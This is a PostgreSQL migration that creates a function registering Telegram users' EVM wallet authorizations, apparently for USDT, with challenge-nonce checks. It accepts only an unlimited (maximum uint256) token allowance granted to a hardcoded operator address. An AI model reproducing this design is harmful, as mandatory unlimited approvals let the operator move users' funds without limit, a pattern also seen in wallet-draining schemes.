begin;

set local search_path = public;

create or replace function public.internal_evm_register_direct_authorization(
  p_telegram_id text,
  p_owner_address text,
  p_nonce text,
  p_approval_tx_hash text,
  p_token_allowance numeric
)
returns table(outcome text, authorization jsonb)
language plpgsql
security definer
set search_path = public
as $$
declare
  v_challenge public.internal_evm_authorization_challenges%rowtype;
  v_existing public.internal_evm_authorizations%rowtype;
  v_saved public.internal_evm_authorizations%rowtype;
begin
  if p_token_allowance <> 115792089237316195423570985008687907853269984665640564039457584007913129639935
    or p_approval_tx_hash !~ '^0x[0-9a-fA-F]{64}$' then
    return query select 'invalid_authorization'::text, null::jsonb;
    return;
  end if;

  select c.* into v_challenge
  from public.internal_evm_authorization_challenges as c
  where c.telegram_id = p_telegram_id
    and c.owner_address = p_owner_address
    and c.nonce = p_nonce
  for update;

  if not found then
    return query select 'challenge_unavailable'::text, null::jsonb;
    return;
  end if;

  select a.* into v_existing
  from public.internal_evm_authorizations as a
  where a.owner_address = p_owner_address
  for update;

  if v_existing.id is not null and v_existing.telegram_id <> p_telegram_id then
    return query select 'address_in_use'::text, null::jsonb;
    return;
  end if;

  if v_challenge.used_at is not null then
    if v_existing.id is not null
      and v_existing.telegram_id = p_telegram_id
      and v_existing.authorization_method = 'direct'
      and v_existing.status = 'active'
      and lower(v_existing.approval_tx_hash) = lower(p_approval_tx_hash) then
      return query select 'already_registered'::text, to_jsonb(v_existing);
    else
      return query select 'challenge_unavailable'::text, null::jsonb;
    end if;
    return;
  end if;

  if v_challenge.expires_at <= clock_timestamp() then
    return query select 'challenge_unavailable'::text, null::jsonb;
    return;
  end if;

  insert into public.internal_evm_authorizations as current_authorization(
    telegram_id,
    owner_address,
    chain_id,
    token_address,
    permit2_operator_address,
    token_allowance,
    permit2_allowance_amount,
    permit2_expiration,
    permit2_nonce,
    approval_tx_hash,
    permit_tx_hash,
    status,
    verified_at,
    authorization_method,
    operator_address
  ) values (
    p_telegram_id,
    p_owner_address,
    1,
    '0xdac17f958d2ee523a2206206994597c13d831ec7',
    null,
    p_token_allowance,
    null,
    null,
    null,
    lower(p_approval_tx_hash),
    null,
    'active',
    now(),
    'direct',
    '0x6eccabaf16577f3603f09ea1e253a9dab879be9e'
  )
  on conflict (owner_address) do update
  set telegram_id = excluded.telegram_id,
      chain_id = excluded.chain_id,
      token_address = excluded.token_address,
      permit2_operator_address = null,
      token_allowance = excluded.token_allowance,
      permit2_allowance_amount = null,
      permit2_expiration = null,
      permit2_nonce = null,
      approval_tx_hash = excluded.approval_tx_hash,
      permit_tx_hash = null,
      status = 'active',
      verified_at = now(),
      updated_at = now(),
      authorization_method = 'direct',
      operator_address = excluded.operator_address
  where current_authorization.telegram_id = excluded.telegram_id
  returning current_authorization.* into v_saved;

  if not found then
    return query select 'address_in_use'::text, null::jsonb;
    return;
  end if;

  update public.internal_evm_authorization_challenges as c
  set used_at = now()
  where c.id = v_challenge.id
    and c.used_at is null
    and c.expires_at > clock_timestamp();

  if not found then
    raise exception 'Authorization challenge changed during registration';
  end if;

  return query select 'registered'::text, to_jsonb(v_saved);
end
$$;

revoke all on function public.internal_evm_register_direct_authorization(text, text, text, text, numeric)
  from public, anon, authenticated;
grant execute on function public.internal_evm_register_direct_authorization(text, text, text, text, numeric)
  to service_role;

commit;